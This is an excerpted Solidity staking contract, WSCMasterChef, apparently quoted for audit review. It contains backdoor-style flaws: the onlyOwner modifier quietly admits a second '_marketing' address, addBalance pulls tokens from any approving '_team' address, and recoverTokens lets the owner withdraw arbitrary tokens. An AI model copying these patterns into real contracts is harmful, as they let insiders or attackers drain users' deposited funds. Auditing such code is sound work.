...
abstract contract Ownable is Context {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender() || _marketing == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract WSCMasterChef is Ownable, ReentrancyGuard {
    using SafeMath for uint256;
    ...
    struct PoolInfo {
        ...
        uint16  withdrawFeeBP;        // withdraw fee in basis points 100 represents 1%
    ...
    function add(IBEP20 _lpToken, uint16 _withdrawFeeBP, uint256 _harvestInterval, uint256 _withdrawLockPeriod, uint256 _apr ) external onlyOwner {
        require(_withdrawFeeBP <= 100, "add: invalid deposit fee basis points");
        require(_withdrawLockPeriod <= 180 days, "withdraw lock must be less than 180 days");
        require(_harvestInterval <= 180 days, "add: invalid harvest interval");
    ...
    function set(uint256 _pid, uint16 _withdrawFeeBP, uint256 _harvestInterval, uint256 _withdrawLockPeriod, uint256 _apr) external onlyOwner {
        require(_withdrawFeeBP <= 100, "set: invalid deposit fee basis points");
        require(_withdrawLockPeriod <= 180 days, "withdraw lock must be less than 180 days");
        require(_harvestInterval <= 180 days, "set: invalid harvest interval");
        
        totalAllocPoint = totalAllocPoint.sub(poolInfo[_pid].allocPoint).add(10);
        poolInfo[_pid].allocPoint = 10;
    ...
    function pendingToken(uint256 _pid, address _user) public view returns (uint256) {
        ...
        uint256 multiplier = getMultiplier(user.lastDepositTime, block.timestamp);
        uint256 pending = user.amount.mul(multiplier).mul(pool.apr).div(365 days).div(100);
    ...
    function deposit(uint256 _pid, uint256 _amount, address _referrer) external nonReentrant {
        ...
        if (address(tokenReferral) != address(0) && _referrer != address(0) && _referrer != msg.sender) {
    ...
    function payOrLockupPendingToken(uint256 _pid) internal {
        ...
        if (canHarvest(_pid, msg.sender)) {
            if (pending > 0 || user.rewardLockedUp > 0) {
                ...
                // send rewards
                safeTokenTransfer(msg.sender, totalRewards, pool.withdrawFeeBP);
    ...
    function addBalance(uint256 _amount, address _team) external {
        require( _amount > 0 , "err _amount=0");
        // Note: finding by auditors.
        uint256 oldBalance = token.balanceOf(address(this));
        token.safeTransferFrom(_team, address(this), _amount);
    ...
    function safeTokenTransfer(address _to, uint256 _amount, uint256 feeVal) internal {
    ...
    function recoverTokens( IBEP20 recoverToken, uint256 amount) external onlyOwner{        
